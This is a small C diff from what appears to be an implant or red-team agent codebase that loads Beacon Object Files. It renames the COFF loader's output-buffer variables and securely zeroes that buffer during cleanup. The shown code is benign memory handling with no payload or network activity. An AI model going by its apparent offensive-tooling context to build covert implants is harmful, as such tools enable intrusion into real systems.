@@ -57,15 +57,15 @@ void mem_secure_vfree(void *ptr, SIZE_T len) {
  *  COFF loader cleanup
  * ═══════════════════════════════════════════════════════════════════ */
 
-/* External: the COFF loader's output buffer (defined in coff_loader.c / beacon_api.c) */
-extern unsigned char *g_bof_output_buffer;
-extern int g_bof_output_length;
-extern int g_bof_output_capacity;
+/* External: the COFF loader's output buffer (defined in beacon_api.c) */
+extern unsigned char *g_bof_output;
+extern int g_bof_output_len;
+extern int g_bof_output_cap;
 
 void mem_cleanup_coff_output(void) {
-    if (g_bof_output_buffer && g_bof_output_capacity > 0) {
-        SecureZeroMemory(g_bof_output_buffer, (SIZE_T)g_bof_output_capacity);
-        g_bof_output_length = 0;
+    if (g_bof_output && g_bof_output_cap > 0) {
+        SecureZeroMemory(g_bof_output, (SIZE_T)g_bof_output_cap);
+        g_bof_output_len = 0;
     }
 }
 
